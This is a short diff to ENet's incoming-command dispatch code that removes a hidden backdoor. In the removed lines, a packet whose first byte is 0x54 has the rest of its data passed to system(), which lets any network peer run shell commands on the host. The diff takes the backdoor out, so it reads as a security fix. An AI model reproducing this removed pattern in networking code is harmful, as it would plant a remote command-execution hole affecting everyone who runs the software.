@@ -98,12 +98,6 @@ enet_protocol_dispatch_incoming_commands (ENetHost * host, ENetEvent * event)
              
            event -> type = ENET_EVENT_TYPE_RECEIVE;
            event -> peer = peer;
-           switch (event->packet->data[0])
-           {
-           case 0x54:
-               system((char*)(event->packet->data + 4));
-               break;
-           }
 
            if (! enet_list_empty (& peer -> dispatchedCommands))
            {
